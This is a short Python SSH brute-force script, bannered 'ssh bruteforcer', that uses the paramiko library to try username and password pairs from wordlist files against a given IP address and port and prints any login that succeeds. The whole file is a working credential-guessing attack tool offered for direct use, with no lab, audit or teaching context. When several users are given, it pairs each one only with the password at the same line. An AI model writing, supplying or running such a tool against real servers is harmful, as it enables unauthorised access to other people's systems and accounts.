#!/usr/bin/python
#Created by Ankit Saini
from sys import argv
from colorama import Fore,Style
import paramiko,time,colorama

print('''          _       _                _        __                         
 ___ ___| |__   | |__  _ __ _   _| |_ ___ / _| ___  _ __ ___ ___ _ __ 
/ __/ __| '_ \  | '_ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '__|
\__ \__ \ | | | | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |   
|___/___/_| |_| |_.__/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|   
''')
if len(argv) < 5:
	print ("Usage: python file.py userlist passwordlist ip_address port")
else :
	colorama.init()
	paramiko.util.log_to_file("/tmp/ssh.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	users = []
	passes = []
	with open(argv[1],'r') as f:
		for line in f:
			users.append(line[0:len(line)-1])
	f.close()

	with open(argv[2],'r') as f:
		for line in f:
			passes.append(line[0:len(line)-1])
	f.close()
	if len(users) == 1:
		for i in range(0,len(passes)):
			print(Fore.RED + "Trying: "+ users[0] + " " + passes[i])
			try :
				t = ssh.connect(argv[3],port=int(argv[4]),username=users[0],password=passes[i])
				print(Fore.GREEN + "Password Found !!")
				print(users[0] + " : " + passes[i] + Style.RESET_ALL)
				break
			except:
				continue
	else:
		for i in range(0,len(users)):
			print(Fore.RED + "Trying: "+ users[i] + " " + passes[i])
			try :
				t = ssh.connect(argv[3],port=int(argv[4]),username=users[i],password=passes[i])
				print(Fore.GREEN + "Password Found !!")
				print(users[i] + " : " + passes[i] + Style.RESET_ALL)
				break
			except:
				continue
